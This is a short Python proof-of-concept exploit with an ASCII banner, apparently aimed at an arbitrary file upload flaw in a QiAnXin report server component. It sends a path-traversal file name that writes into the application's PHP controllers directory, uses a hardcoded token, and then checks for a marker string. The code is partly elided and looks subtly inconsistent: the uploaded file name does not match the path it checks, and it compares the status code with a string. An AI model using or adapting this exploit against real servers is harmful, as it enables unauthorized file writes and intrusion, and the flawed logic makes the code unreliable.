              ...
              "8aa8"      88           88,d88'      88 88  `8b   88 88             
               `88'       88           8888"88,     88 88   `8b  88 88      88888  
                ...
                88        88           88     "88,  88 88     `888   `"Y88888P"   
                            ...
                            tag: this is a  qax某擎 rptsvr 任意文件上传 poc                                       
...
def poc(target):
    ...
    files = {
        "uploadfile": ("../../../application/api/controllers/1.php", "y1k1ng", "text/x-python"),
    }
    data = {
        'token': 'skylar_report'
    }
    try:
        ...
        if response.status_code == 200 :
            ...
            url_path = "/application/api/controllers/TController.php"
            url_result = target + url_path
            r2 = requests.get(url=url_result)
            if r2.status_code == "200" and "y1k1ng" in r2.text:
